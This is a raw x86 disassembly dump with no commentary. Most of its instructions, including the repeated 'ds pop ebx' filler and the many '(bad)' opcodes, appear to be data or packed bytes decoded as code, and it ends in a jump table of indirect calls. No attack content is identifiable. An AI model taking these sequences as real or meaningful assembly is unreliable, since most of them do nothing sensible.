  423c37:	push   eax
  423c38:	es sub esp,edi
  423c3b:	jmp    FWORD PTR [ecx]
  423c3d:	fld    st(3)
  423c3f:	or     BYTE PTR [edi+0x7e6af41e],dh
  423c45:	ror    BYTE PTR [edx-0x8],1
  423c48:	outs   dx,DWORD PTR ds:[esi]
  423c49:	rcl    BYTE PTR [edx],1
  423c4b:	sbb    al,0x86
  423c4d:	sbb    al,BYTE PTR [eax]
  423c4f:	mov    edi,DWORD PTR [ebx+ebp*1+0x50]
  423c53:	push   0x3e
  423c55:	les    edx,FWORD PTR [edx-0xc]
  423c58:	popf   
  423c59:	outs   dx,DWORD PTR ds:[esi]
  423c5a:	js     0x423c9d
  423c5c:	fdivr  DWORD PTR ds:[edx]
  423c5f:	adc    al,0x66
  423c61:	sbb    al,BYTE PTR [eax]
  423c63:	add    BYTE PTR [ebx+0x5c],dl
  423c66:	mov    eax,0x2
	...
  423c8f:	add    BYTE PTR [eax],al
  423c91:	add    BYTE PTR [esi],bh
  423c93:	pop    ebx
  423c94:	add    bl,ch
  423c96:	push   esp
  423c97:	ror    BYTE PTR [edx],1
  423c99:	add    BYTE PTR [ebx+ebx*1],bh
  423c9c:	add    BYTE PTR [ecx+0x67cb0b],cl
  423ca2:	sub    DWORD PTR [edx+0x0],ebx
  423ca5:	push   0x40593e
  423caa:	mov    ch,0x6e
  423cac:	adc    al,0x78
  423cae:	call   FWORD PTR [edx+0x7f]
  423cb1:	ret    0x593e
  423cb4:	add    BYTE PTR [eax],al
  423cb6:	in     al,dx
  423cb7:	mov    dl,0x9d
  423cb9:	inc    BYTE PTR [ecx+0x4ac480c4]
  423cbf:	add    eax,DWORD PTR [eax]
  423cc1:	add    bh,dh
  423cc3:	pop    edx
  423cc4:	sub    eax,DWORD PTR [eax]
  423cc6:	cmp    al,0x5b
  423cc8:	add    BYTE PTR [ebx+0x41786f33],cl
  423cce:	ds jo  0x423c99
  423cd1:	mov    DWORD PTR [ebx+0x1f],eax
  423cd4:	js     0x423d17
  423cd6:	rcl    BYTE PTR ds:[edx],1
  423cd9:	inc    esp
  423cda:	(bad)  
  423cdb:	sbb    DWORD PTR [eax],eax
  423cdd:	push   edx
  423cde:	fild   QWORD PTR [esi+0x78]
  423ce1:	inc    ecx
  423ce2:	sub    ecx,DWORD PTR ds:[ecx-0x17d5d1b3]
  423ce9:	popf   
  423cea:	and    al,ah
  423cec:	cld    
  423ced:	add    DWORD PTR [edx],0x57
  423cf0:	mov    DWORD PTR ds:0x3f432a,edx
	...
  423d1e:	add    BYTE PTR [eax],al
  423d20:	cmp    eax,0x6b89082e
  423d25:	mov    bl,0x88
  423d27:	push   ebp
  423d28:	out    0xc3,al
  423d2a:	loope  0x423cb7
  423d2c:	(bad)  ds:0x96faccc1
  423d32:	retf   
  423d33:	int3   
  423d34:	mov    edx,eax
  423d36:	jmp    0x423cc3
  423d38:	adc    DWORD PTR [ebx+0x39],0x45
  423d3c:	inc    edx
  423d3d:	dec    eax
  423d3e:	add    eax,0xe953838b
  423d43:	add    eax,0x458957d5
  423d48:	dec    edx
  423d49:	es ror esp,0x82
  423d4d:	xchg   esi,eax
  423d4e:	retf   
  423d4f:	int3   
  423d50:	jp     0x423ce8
  423d52:	retf   
  423d53:	int3   
  423d54:	or     edx,eax
  423d56:	jmp    0x423cdb
  423d58:	stos   BYTE PTR es:[edi],al
  423d59:	jbe    0x423d20
  423d5b:	inc    ebp
  423d5c:	xchg   edx,eax
  423d5d:	pop    edx
  423d5e:	nop
  423d5f:	add    DWORD PTR [esi],edi
  423d61:	rol    BYTE PTR [edx+0x8],1
  423d64:	mov    bh,0x1d
  423d66:	fmul   DWORD PTR [ebx+0x5588a30b]
  423d6c:	inc    esi
  423d6d:	pop    eax
  423d6e:	dec    edi
  423d6f:	cmp    al,0xb7
  423d71:	sub    eax,0xbafb8be0
  423d76:	or     al,0xb7
  423d78:	push   es
  423d79:	outs   dx,DWORD PTR ds:[esi]
  423d7a:	mov    DWORD PTR [ebp+0x5e],edx
  423d7d:	aad    0x43
  423d7f:	or     ah,BYTE PTR [esi]
  423d81:	rol    BYTE PTR [edx-0x18],cl
	...
  423dac:	add    BYTE PTR [eax],al
  423dae:	(bad)  
  423daf:	outs   dx,BYTE PTR ds:[esi]
  423db0:	add    DWORD PTR [eax+0x3e],eax
  423db3:	(bad)  
  423db4:	or     bh,BYTE PTR [esi+esi*4]
  423db7:	sbb    al,0x0
  423db9:	push   ecx
  423dba:	push   ss
  423dbb:	adc    edi,ecx
  423dbd:	jmp    DWORD PTR [ecx]
  423dbf:	ffreep st(3)
  423dc1:	or     bh,al
  423dc3:	sbb    al,dh
  423dc5:	push   0x7e
  423dc7:	xor    eax,DWORD PTR [eax]
  423dc9:	xor    BYTE PTR [esi],bh
  423dcb:	pop    ebx
  423dcc:	push   0x5cae00
  423dd1:	push   0x3e
  423dd3:	ret    0xf052
  423dd6:	(bad)  
  423dd7:	sbb    ah,ah
  423dd9:	mov    edx,DWORD PTR [ebx-0x75bd7745]
  423ddf:	sub    ecx,DWORD PTR [ecx-0x76d3b9b3]
  423de5:	push   ebp
  423de6:	fisubr DWORD PTR ds:0xc2cbc1e8
  423dec:	cld    
  423ded:	cmp    edx,0x4f
  423df0:	lds    eax,FWORD PTR [ebp-0x4e]
  423df3:	pop    ebx
  423df4:	add    BYTE PTR [eax],al
  423df6:	ds mov dh,0x6
  423df9:	mov    eax,DWORD PTR [ebx]
  423dfb:	mov    DWORD PTR [eax+0x42d43fc0],0xe010c5f4
  423e05:	bswap  ecx
  423e07:	sub    al,0x6
  423e09:	cmp    ebx,esi
  423e0b:	(bad)  
  423e0c:	jo     0x423e67
  423e0e:	mov    ch,0x18
  423e10:	call   0x423e98
	...
  423e39:	add    BYTE PTR [eax],al
  423e3b:	add    dh,dh
  423e3d:	data16 add BYTE PTR [ebx+edi*8-0x2b],dh
  423e42:	dec    edx
  423e43:	call   0x528305
  423e48:	jmp    0x41d6:0x6655897e
  423e4f:	adc    ch,al
  423e51:	adc    al,ah
  423e53:	mov    ebp,edi
  423e55:	jle    0x423de2
  423e57:	inc    esp
  423e58:	cs ret 0x4d88
  423e5c:	push   ds
  423e5d:	mov    ss,edx
  423e5f:	imul   DWORD PTR [edi+0x1e55897f]
  423e65:	push   edx
  423e66:	lods   eax,DWORD PTR ds:[esi]
  423e67:	inc    edx
  423e68:	bound  ebp,QWORD PTR [ebx]
  423e6a:	mov    DWORD PTR [ebp+0x26],eax
  423e6d:	(bad)  
  423e6e:	dec    edx
  423e6f:	or     BYTE PTR ds:0xb5511413,bh
  423e75:	daa    
  423e76:	call   0xf9ba06
  423e7b:	inc    edx
  423e7c:	dec    edx
  423e7d:	sub    ebp,eax
  423e7f:	push   ebp
  423e80:	repz sar esp,0x83
  423e84:	add    cl,BYTE PTR [edi-0x77]
  423e87:	dec    ebp
  423e88:	(bad)  
  423e89:	fnstsw WORD PTR [esi-0x17f038d8]
  423e8f:	jmp    0x423e3d
  423e91:	aad    0x52
  423e93:	in     al,0x6c
  423e95:	mov    bl,0xd
  423e97:	cld    
  423e98:	rol    ecx,0x80
  423e9b:	les    eax,FWORD PTR [edx+0x33]
  423e9e:	and    al,0x3
	...
  423ec8:	add    BYTE PTR [eax],al
  423eca:	(bad)  
  423ecb:	pop    edx
  423ecc:	lahf   
  423ecd:	cmp    al,0x26
  423ecf:	sbb    al,0x0
  423ed1:	push   eax
  423ed2:	xchg   esi,eax
  423ed3:	aad    0xf9
  423ed5:	call   FWORD PTR [ecx-0x38f73c23]
  423edb:	pop    ss
  423edc:	fadd   QWORD PTR [ebx+0x4178834b]
  423ee2:	ds pop ebx
  423ee4:	jae    0x423ef0
  423ee6:	lds    ecx,FWORD PTR [edi+0x30]
  423ee9:	js     0x423eea
  423eeb:	pop    edx
  423eec:	dec    edi
  423eed:	call   DWORD PTR [ebx]
  423eef:	lahf   
  423ef0:	cmp    BYTE PTR ds:0x3f4326,0x3e
  423ef7:	dec    eax
  423ef8:	sbb    al,0x6a
  423efa:	(bad)  
  423efb:	xor    al,BYTE PTR [eax]
  423efd:	xor    BYTE PTR [esi],bh
  423eff:	pop    ebx
  423f00:	mov    DWORD PTR [ebp+0x42],edx
  423f03:	sub    al,0x89
  423f05:	inc    ebp
  423f06:	push   ds
  423f07:	aad    0x47
  423f09:	xor    al,0x8f
  423f0b:	rcl    BYTE PTR [edx-0x10],0xdd
  423f0f:	addr16 js 0x423f53
  423f12:	ds mov ah,0x12
  423f15:	push   0x7e
  423f17:	xor    eax,DWORD PTR [eax]
  423f19:	xor    BYTE PTR [esi],bh
  423f1b:	pop    ebx
  423f1c:	mov    DWORD PTR [ebp+0xa],edx
  423f1f:	cs push 0x0
  423f22:	add    DWORD PTR [edi],esp
  423f24:	lock mov ds:0x3f4352,eax
  423f2a:	mov    ebp,0x78147e
	...
  423f57:	add    BYTE PTR [edi+0x5b],bh
  423f5a:	add    BYTE PTR [ebp+0x4b],dh
  423f5d:	xor    eax,0x8b3e6840
  423f62:	add    BYTE PTR [eax],al
  423f64:	lds    edx,FWORD PTR [esi]
  423f66:	cld    
  423f67:	push   eax
  423f68:	push   esp
  423f69:	pop    ebx
  423f6a:	std    
  423f6b:	push   ebp
  423f6c:	into   
  423f6d:	cld    
  423f6e:	adc    edi,DWORD PTR [eax-0x1]
  423f71:	pop    edx
  423f72:	mov    DWORD PTR [ebp-0x66],ecx
  423f75:	ror    BYTE PTR [edx-0x28],cl
  423f78:	mov    ch,0x26
  423f7a:	fmul   DWORD PTR [ebx+0x4200a2fb]
  423f80:	pop    edx
  423f81:	rol    BYTE PTR [edx-0x20],cl
  423f84:	lds    ecx,FWORD PTR [esi]
  423f86:	cld    
  423f87:	push   ecx
  423f88:	mov    ch,0x26
  423f8a:	in     al,0x52
  423f8c:	fbld   TBYTE PTR [edi+0x78]
  423f8f:	inc    ecx
  423f90:	ds sub ebp,eax
  423f93:	xchg   ebp,eax
  423f94:	jb     0x423f56
  423f96:	cld    
  423f97:	add    DWORD PTR [edx+0x5e4d894f],0xffffffdc
  423f9e:	mov    dh,0xa4
  423fa0:	ds pop ebx
  423fa2:	add    BYTE PTR [eax],al
  423fa4:	retf   0x8984
  423fa7:	push   ebp
  423fa8:	pop    esi
  423fa9:	aam    0x42
  423fab:	fdivr  DWORD PTR ds:0x3e009fdd
  423fb1:	pop    ebx
  423fb2:	xchg   DWORD PTR [ebp+0x22],eax
  423fb5:	aam    0x4a
  423fb7:	loopne 0x423f6e
  423fb9:	gs adc al,0x78
	...
  423fe4:	add    BYTE PTR [eax],al
  423fe6:	jg     0x424043
  423fe8:	sub    DWORD PTR [ecx+0x52],edx
  423feb:	rcl    BYTE PTR [edx],cl
  423fed:	inc    esp
  423fee:	xchg   esi,eax
  423fef:	sbb    al,BYTE PTR [eax]
  423ff1:	mov    eax,ds:0x3f4382
  423ff6:	outs   dx,BYTE PTR ds:[esi]
  423ff7:	aam    0xa
  423ff9:	adc    al,0x76
  423ffb:	sbb    al,BYTE PTR [eax]
  423ffd:	push   ecx
  423ffe:	lds    esp,FWORD PTR ds:0x3fd652ec
  424004:	cli    
  424005:	jmp    ecx
  424007:	fcmovnb st,st(3)
  424009:	or     al,0xc5
  42400b:	adc    eax,0x67438be0
  424010:	js     0x424053
  424012:	ds pop esp
  424014:	dec    eax
  424015:	sub    BYTE PTR [edi-0x87abb3],dh
  42401b:	pop    edx
  42401c:	cmp    DWORD PTR ds:0x3f4376,0x8b2b463e
  424026:	dec    ebx
  424027:	addr16 js 0x42406b
  42402a:	ds sub eax,0x1a16549f
  424030:	add    BYTE PTR [eax-0x4b],dl
  424033:	dec    ebp
  424034:	xor    BYTE PTR [eax-0x1],bh
  424037:	pop    edx
  424038:	dec    edi
  424039:	call   0x3eff34
  42403e:	mov    ebp,0x538b0b96
  424043:	addr16 js 0x424087
  424046:	ds sub eax,0x49e8
	...
  424074:	push   edi
  424075:	mov    edi,0x567a83fc
  42407a:	jmp    0x1c916e0
  42407f:	inc    eax
  424080:	ds cli 
  424082:	cmp    edi,DWORD PTR [eax+0x7f]
  424085:	pop    ebx
  424086:	push   eax
  424087:	call   0x3f0516
  42408c:	mov    ebp,0x7b890797
  424091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424092:	mov    BYTE PTR ds:0x3f4332,cl
  424098:	outs   dx,DWORD PTR ds:[esi]
  424099:	rcl    BYTE PTR [edx-0x20],cl
  42409c:	fbld   TBYTE PTR [edi+0x78]
  42409f:	inc    ecx
  4240a0:	ds pop edx
  4240a2:	inc    edx
  4240a3:	sub    BYTE PTR [esi+0x76300ad2],cl
  4240a9:	sbb    al,0x0
  4240ab:	push   ecx
  4240ac:	(bad)  
  4240ad:	outs   dx,BYTE PTR ds:[esi]
  4240ae:	cld    
  4240af:	jmp    ecx
  4240b1:	fcmovb st,st(3)
  4240b3:	or     al,0xc5
  4240b5:	push   0x5b7f7830
  4240ba:	jg     0x42407e
  4240bc:	scas   al,BYTE PTR es:[edi]
  4240bd:	dec    eax
  4240be:	(bad)  
  4240bf:	push   DWORD PTR [edi-0x87a398]
  4240c5:	pop    edx
  4240c6:	mov    eax,DWORD PTR [ebp-0x4a]
  4240c9:	sub    ebp,DWORD PTR [edx+0x40]
  4240cc:	adc    al,0x55
  4240ce:	mov    DWORD PTR ds:0x3f4302,ecx
  4240d4:	out    dx,eax
  4240d5:	mov    ebp,0xd452
	...
  424102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424103:	mov    edx,0x389fff8
  424108:	(bad)  
  424109:	(bad)  
  42410a:	ds pop ebx
  42410c:	mov    ebp,esp
  42410e:	sbb    ebx,DWORD PTR [ecx-0x707dfffd]
  424114:	retf   
  424115:	int3   
  424116:	jp     0x4240a7
  424118:	retf   
  424119:	int3   
  42411a:	or     edx,edx
  42411c:	jmp    0x4240a9
  42411e:	add    edx,DWORD PTR [ebx-0x77]
  424121:	inc    eax
  424122:	push   edx
  424123:	and    cl,al
  424125:	int3   
  424126:	jp     0x4240b7
  424128:	retf   
  424129:	int3   
  42412a:	jmp    0x4240fd
  42412c:	jmp    0x424181
  42412e:	nop
  42412f:	mov    DWORD PTR es:0x3f435e,edi
  424136:	mov    ch,0x5f
  424138:	sub    al,0x78
  42413a:	jg     0x424197
  42413c:	mov    DWORD PTR ds:0x3f4336,esi
  424142:	jno    0x424161
  424144:	pop    ecx
  424145:	pop    ebp
  424146:	std    
  424147:	mov    cs,ebx
  424149:	int3   
  42414a:	imul   edx,edx,0xffffffeb
  42414d:	push   ecx
  42414e:	popw   ss
  424150:	add    DWORD PTR [eax+0x3e],eax
  424153:	cld    
  424154:	cmp    edi,DWORD PTR [eax+0x7f]
  424157:	pop    ebx
  424158:	push   eax
  424159:	call   0x3f03f0
  42415e:	mov    ebp,0x7b890796
  424163:	mov    edi,0x4d88
	...
  424190:	ss sub al,0x6a
  424193:	add    BYTE PTR [ebp-0x87a799],dh
  424199:	pop    edx
  42419a:	push   edx
  42419b:	dec    DWORD PTR [ebx]
  42419d:	mov    edi,0x9a0be588
  4241a2:	retf   
  4241a3:	int3   
  4241a4:	or     edx,edx
  4241a6:	jmp    0x42412b
  4241a8:	stos   BYTE PTR es:[edi],al
  4241a9:	jbe    0x424170
  4241ab:	inc    ebp
  4241ac:	xchg   esi,eax
  4241ad:	pop    edx
  4241ae:	add    BYTE PTR [eax],al
  4241b0:	ds xchg esi,eax
  4241b2:	inc    edx
  4241b3:	fadd   QWORD PTR [esi]
  4241b5:	pop    ebx
  4241b6:	add    BYTE PTR [eax],al
  4241b8:	adc    DWORD PTR [edi],0x5b3e01f4
  4241be:	add    bh,al
  4241c0:	add    edi,DWORD PTR [edi+0x5b3effff]
  4241c6:	lds    eax,FWORD PTR [ebp+0x62]
  4241c9:	pop    edx
  4241ca:	add    BYTE PTR [eax],al
  4241cc:	ror    BYTE PTR ds:[edx+0x8],cl
  4241d0:	mov    bh,0x4f
  4241d2:	xor    BYTE PTR [eax-0x1],bh
  4241d5:	pop    edx
  4241d6:	call   0xfcff7384
  4241db:	mov    eax,ds:0x3f436e
  4241e0:	arpl   WORD PTR [esp+edi*8+0xc473e00],di
  4241e7:	mov    DWORD PTR [ebx-0x7d],0x5b3e4178
  4241ee:	add    BYTE PTR [eax],al
  4241f0:	ds mov al,0x9
  4241f3:	mov    DWORD PTR [eax],0x0
	...
  42421d:	add    BYTE PTR [ebx],bh
  42421f:	cmp    DWORD PTR [eax+0x41],0x3e
  424223:	pop    edx
  424224:	add    BYTE PTR [eax],al
  424226:	fdivr  DWORD PTR ds:[edx]
  424229:	xor    BYTE PTR [esi+0x1a],ah
  42422c:	add    BYTE PTR [eax],al
  42422e:	imul   edx,DWORD PTR [ecx-0x3b],0x5
  424232:	push   ss
  424233:	inc    ebx
  424234:	aas    
  424235:	add    BYTE PTR [esi],bh
  424237:	pop    ebx
  424238:	add    BYTE PTR [eax],al
  42423a:	mov    ebp,0x7f78387e
  42423f:	pop    ebx
  424240:	add    BYTE PTR [ebp+0x4b],dh
  424243:	xor    DWORD PTR [eax],eax
  424245:	dec    DWORD PTR [ebx+0x5b]
  424248:	js     0x42428b
  42424a:	ds clc 
  42424c:	das    
  42424d:	js     0x42424e
  42424f:	pop    edx
  424250:	mov    DWORD PTR ds:0x3f434e,ecx
  424256:	(bad)  
  424257:	push   cs
  424258:	call   0x78cd75e8
  42425d:	inc    ecx
  42425e:	rol    BYTE PTR ds:[edx-0x18],1
  424262:	cmp    eax,0xfb893c19
  424267:	mov    dl,0x88
  424269:	dec    ebp
  42426a:	push   esi
  42426b:	ror    BYTE PTR [edx],cl
  42426d:	sbb    al,0xe6
  42426f:	sbb    DWORD PTR [eax],eax
  424271:	push   0x4057ee
  424276:	push   ecx
  424277:	data16 add BYTE PTR [eax-0x1],bh
  42427b:	pop    edx
  42427c:	mov    eax,ds:0x19c63c
  424281:	mov    DWORD PTR [eax],0x0
	...
  4242ab:	add    BYTE PTR [ebx+0xf],al
  4242ae:	js     0x4242f1
  4242b0:	ds inc esi
  4242b2:	add    DWORD PTR [eax+0x3e],eax
  4242b5:	xor    esp,DWORD PTR [eax+0x3]
  4242b8:	jle    0x424315
  4242ba:	mov    DWORD PTR ds:0x3f435a,edx
  4242c0:	ins    BYTE PTR es:[edi],dx
  4242c1:	mov    bl,0xc1
  4242c3:	test   DWORD PTR [ecx],0x36c480bc
  4242c9:	clc    
  4242ca:	inc    edi
  4242cb:	js     0x42434c
  4242cd:	pop    ebx
  4242ce:	std    
  4242cf:	adc    eax,0x3f4386
  4242d4:	popf   
  4242d5:	and    bh,BYTE PTR [eax+0x41]
  4242d8:	ds cli 
  4242da:	dec    ebx
  4242db:	js     0x42435c
  4242dd:	pop    ebx
  4242de:	push   eax
  4242df:	call   0x3eff6e
  4242e4:	mov    ebp,0x7b890396
  4242e9:	retf   
  4242ea:	mov    BYTE PTR [ebp-0x52],cl
  4242ed:	sub    eax,ebp
  4242ef:	aad    0xb0
  4242f1:	mov    ebx,0x568283fc
  4242f6:	mov    eax,ds:0x1a2634
  4242fb:	mov    esi,ebx
  4242fd:	retf   0x6a51
  424300:	ds cli 
  424302:	xor    edi,DWORD PTR [eax-0x1]
  424305:	pop    edx
  424306:	push   eax
  424307:	call   0x3f06ae
  42430c:	mov    ebp,0x8b0b96
	...
  424339:	add    BYTE PTR [ebx],al
  42433b:	retf   
  42433c:	xchg   BYTE PTR [ebp+0x5e],cl
  42433f:	iret   
  424340:	push   edx
  424341:	cld    
  424342:	and    eax,0xf473f026
  424347:	iret   
  424348:	inc    edx
  424349:	loopne 0x424339
  42434b:	iret   
  42434c:	dec    edx
  42434d:	fsub   st(7),st
  42434f:	mov    dl,0xad
  424351:	sti    
  424352:	inc    ecx
  424353:	mov    ebx,0xfe46c480
  424358:	aas    
  424359:	js     0x4243da
  42435b:	pop    ebx
  42435c:	mov    DWORD PTR ds:0x3f337e,edx
  424362:	mov    esp,?
  424364:	dec    ebx
  424365:	js     0x4243e6
  424367:	pop    ebx
  424368:	add    DWORD PTR [ebp+0x1a],eax
  42436b:	or     al,0x89
  42436d:	or     eax,0x3f3352
  424372:	cmp    eax,0xe651fc28
  424377:	xchg   edx,eax
  424378:	idiv   bh
  42437a:	icebp  
  42437b:	faddp  st(3),st
  42437d:	or     al,0xb5
  42437f:	adc    ah,dh
  424381:	add    ecx,DWORD PTR [ebx-0x1daaff69]
  424387:	in     al,0x52
  424389:	in     al,0xc5
  42438b:	and    ah,bh
  42438d:	add    eax,DWORD PTR [ebx-0x3dba7969]
  424393:	out    0x4a,al
  424395:	loopne 0x4243fc
  424397:	push   0x5aff7840
  42439c:	xchg   DWORD PTR [ebp+0x0],ecx
	...
  4243c7:	add    BYTE PTR [esi-0x438623a],bl
  4243cd:	mov    dl,0xff
  4243cf:	(bad)  
  4243d0:	ds pop ebx
  4243d2:	jmp    0xf85308e0
  4243d7:	cmp    DWORD PTR [edi+ebx*2-0x79],0x55
  4243dc:	xchg   dh,ah
  4243de:	inc    edx
  4243df:	clc    
  4243e0:	xor    eax,0x3673f020
  4243e5:	out    0xa,al
  4243e7:	xor    al,0xe6
  4243e9:	sbb    eax,DWORD PTR [eax]
  4243eb:	add    esi,ebx
  4243ed:	mov    dl,0x88
  4243ef:	adc    DWORD PTR ds:0xaa1f810,edi
  4243f5:	xor    edi,DWORD PTR [edi]
  4243f7:	add    BYTE PTR ds:0x2e89f820,bh
  4243fd:	out    0x4a,al
  4243ff:	clc    
  424400:	mov    edi,0x3e03e69b
  424405:	pop    ebx
  424406:	mov    DWORD PTR ds:0x3f3372,edx
  42440c:	cmp    eax,0x4433f810
  424411:	cld    
  424412:	xor    edi,DWORD PTR [eax+0x7f]
  424415:	pop    ebx
  424416:	add    DWORD PTR [ebp+0x6],eax
  424419:	in     al,0x7
  42441b:	jmp    0x4243e6
  42441d:	jecxz  0x424449
  42441f:	and    al,0x76
  424421:	sbb    al,0x0
  424423:	mov    DWORD PTR [ebx],esi
  424425:	jnp    0x42449f
  424427:	inc    ecx
  424428:	outs   dx,BYTE PTR ds:[esi]
  42442a:	(bad)  
  42442b:	mov    DWORD PTR [eax],eax
	...
  424455:	add    BYTE PTR [ebx],ch
  424457:	push   ebx
  424458:	js     0x42449b
  42445a:	outs   dx,BYTE PTR ds:[esi]
  42445c:	(bad)  
  42445d:	mov    DWORD PTR [ebx],esi
  42445f:	xchg   DWORD PTR [eax+0x41],edi
  424462:	ds ret 
  424464:	dec    ebp
  424465:	test   ecx,0xe90d8ab9
  42446b:	xor    DWORD PTR [edi],edi
  42446d:	add    bh,al
  42446f:	daa    
  424470:	clc    
  424471:	mov    ecx,0x405d3e
  424476:	mov    edi,0x3e01ffc3
  42447b:	pop    ebx
  42447c:	mov    DWORD PTR [ebp-0x6a],edx
  42447f:	test   edi,ecx
  424481:	mov    DWORD PTR [ebx],esi
  424483:	cmp    DWORD PTR [eax+0x41],0x3e
  424487:	cld    
  424488:	daa    
  424489:	js     0x42448a
  42448b:	pop    edx
  42448c:	push   eax
  42448d:	call   0x3ef9cc
  424492:	mov    ebp,0x338b039e
  424497:	outs   dx,DWORD PTR ds:[esi]
  424498:	js     0x4244db
  42449a:	ds or  al,0xe8
  42449d:	aad    0x54
  42449f:	mov    ecx,0x2f7e85fc
  4244a4:	add    al,0x33
  4244a6:	jle    0x42446d
  4244a8:	sub    DWORD PTR [ebx+0x41787f63],ecx
  4244ae:	ds fadd st(3),st
  4244b1:	add    al,0xbd
  4244b3:	jbe    0x4244ed
  4244b5:	js     0x424536
  4244b7:	pop    ebx
  4244b8:	add    BYTE PTR [eax+eax*1+0x0],dh
	...
  4244e4:	inc    edi
  4244e5:	cli    
  4244e6:	adc    edi,DWORD PTR [eax+0x7f]
  4244e9:	pop    ebx
  4244ea:	xchg   DWORD PTR [edx+eiz*2+0x5f],eax
  4244ee:	call   0xfcfb4850
  4244f3:	mov    edx,DWORD PTR [ebx+0xf]
  4244f6:	js     0x424539
  4244f8:	ds or  eax,0xe4fe33c1
  4244fe:	loop   0x42455d
  424500:	std    
  424501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424502:	retf   
  424503:	int3   
  424504:	ds pop ebx
  424506:	add    BYTE PTR [eax],al
  424508:	ds pop ebx
  42450a:	add    BYTE PTR [eax],al
  42450c:	ds pop ebx
  42450e:	add    BYTE PTR [eax],al
  424510:	ds pop ebx
  424512:	add    BYTE PTR [eax],al
  424514:	ds pop ebx
  424516:	add    BYTE PTR [eax],al
  424518:	ds pop ebx
  42451a:	add    BYTE PTR [eax],al
  42451c:	ds pop ebx
  42451e:	add    BYTE PTR [eax],al
  424520:	ds pop ebx
  424522:	add    BYTE PTR [eax],al
  424524:	ds pop ebx
  424526:	add    BYTE PTR [eax],al
  424528:	ds pop ebx
  42452a:	add    BYTE PTR [eax],al
  42452c:	ds pop ebx
  42452e:	add    BYTE PTR [eax],al
  424530:	ds pop ebx
  424532:	add    BYTE PTR [eax],al
  424534:	ds pop ebx
  424536:	add    BYTE PTR [eax],al
  424538:	ds pop ebx
  42453a:	add    BYTE PTR [eax],al
  42453c:	ds pop ebx
  42453e:	add    BYTE PTR [eax],al
  424540:	ds pop ebx
  424542:	add    BYTE PTR [eax],al
  424544:	ds pop ebx
	...
  424572:	ds pop ebx
  424574:	add    BYTE PTR [eax],al
  424576:	ds pop ebx
  424578:	add    BYTE PTR [eax],al
  42457a:	ds pop ebx
  42457c:	add    BYTE PTR [eax],al
  42457e:	ds pop ebx
  424580:	add    BYTE PTR [eax],al
  424582:	ds pop ebx
  424584:	add    BYTE PTR [eax],al
  424586:	ds pop ebx
  424588:	add    BYTE PTR [eax],al
  42458a:	ds pop ebx
  42458c:	add    BYTE PTR [eax],al
  42458e:	ds pop ebx
  424590:	add    BYTE PTR [eax],al
  424592:	ds pop ebx
  424594:	add    BYTE PTR [eax],al
  424596:	ds pop ebx
  424598:	add    BYTE PTR [eax],al
  42459a:	ds pop ebx
  42459c:	add    BYTE PTR [eax],al
  42459e:	ds pop ebx
  4245a0:	add    BYTE PTR [eax],al
  4245a2:	ds pop ebx
  4245a4:	add    BYTE PTR [eax],al
  4245a6:	ds pop ebx
  4245a8:	add    BYTE PTR [eax],al
  4245aa:	ds pop ebx
  4245ac:	add    BYTE PTR [eax],al
  4245ae:	ds pop ebx
  4245b0:	add    BYTE PTR [eax],al
  4245b2:	ds pop ebx
  4245b4:	add    BYTE PTR [eax],al
  4245b6:	ds pop ebx
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	ds pop ebx
  4245bc:	add    BYTE PTR [eax],al
  4245be:	ds pop ebx
  4245c0:	add    BYTE PTR [eax],al
  4245c2:	ds pop ebx
  4245c4:	add    BYTE PTR [eax],al
  4245c6:	ds pop ebx
  4245c8:	add    BYTE PTR [eax],al
  4245ca:	ds pop ebx
  4245cc:	add    BYTE PTR [eax],al
  4245ce:	ds pop ebx
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	ds pop ebx
	...
  424600:	ds pop ebx
  424602:	add    BYTE PTR [eax],al
  424604:	ds pop ebx
  424606:	add    BYTE PTR [eax],al
  424608:	ds pop ebx
  42460a:	add    BYTE PTR [eax],al
  42460c:	ds pop ebx
  42460e:	add    BYTE PTR [eax],al
  424610:	ds pop ebx
  424612:	add    BYTE PTR [eax],al
  424614:	ds pop ebx
  424616:	add    BYTE PTR [eax],al
  424618:	ds pop ebx
  42461a:	add    BYTE PTR [eax],al
  42461c:	ds pop ebx
  42461e:	add    BYTE PTR [eax],al
  424620:	ds pop ebx
  424622:	add    BYTE PTR [eax],al
  424624:	ds pop ebx
  424626:	add    BYTE PTR [eax],al
  424628:	ds pop ebx
  42462a:	add    BYTE PTR [eax],al
  42462c:	ds pop ebx
  42462e:	add    BYTE PTR [eax],al
  424630:	ds pop ebx
  424632:	add    BYTE PTR [eax],al
  424634:	ds pop ebx
  424636:	add    BYTE PTR [eax],al
  424638:	ds pop ebx
  42463a:	add    BYTE PTR [eax],al
  42463c:	ds pop ebx
  42463e:	add    BYTE PTR [eax],al
  424640:	ds pop ebx
  424642:	add    BYTE PTR [eax],al
  424644:	ds pop ebx
  424646:	add    BYTE PTR [eax],al
  424648:	ds pop ebx
  42464a:	add    BYTE PTR [eax],al
  42464c:	ds pop ebx
  42464e:	add    BYTE PTR [eax],al
  424650:	ds pop ebx
  424652:	add    BYTE PTR [eax],al
  424654:	ds pop ebx
  424656:	add    BYTE PTR [eax],al
  424658:	ds pop ebx
  42465a:	add    BYTE PTR [eax],al
  42465c:	ds pop ebx
  42465e:	add    BYTE PTR [eax],al
  424660:	ds pop ebx
	...
  42468e:	jmp    DWORD PTR ds:0x42ed9c
  424694:	jmp    DWORD PTR ds:0x42eda0
  42469a:	jmp    DWORD PTR ds:0x42eda4
  4246a0:	jmp    DWORD PTR ds:0x42eda8
  4246a6:	jmp    DWORD PTR ds:0x42edac
  4246ac:	jmp    DWORD PTR ds:0x42edb0
  4246b2:	jmp    DWORD PTR ds:0x42edb4
  4246b8:	jmp    DWORD PTR ds:0x42edbc
  4246be:	jmp    DWORD PTR ds:0x42edc4
  4246c4:	jmp    DWORD PTR ds:0x42edc8
